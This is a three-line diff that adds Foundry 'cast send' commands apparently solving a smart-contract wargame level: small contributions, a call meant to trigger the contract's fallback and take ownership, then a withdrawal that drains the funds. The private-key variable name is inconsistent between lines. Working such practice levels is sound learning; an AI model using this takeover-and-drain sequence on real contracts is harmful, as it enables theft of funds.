@@ -1,0 +1,3 @@
+cast send $LEVEL_ADDRESS "contribute()" --value 0.0001ether --private-key=$PRIV_KEY 
+cast send $LEVEL_ADDRESS "fallback()" --value 0.0001ether --private-key=$PRIVATE_KEY 
+cast send $LEVEL_ADDRESS "withdraw()" --private-key=$PRIVATE_KEY 
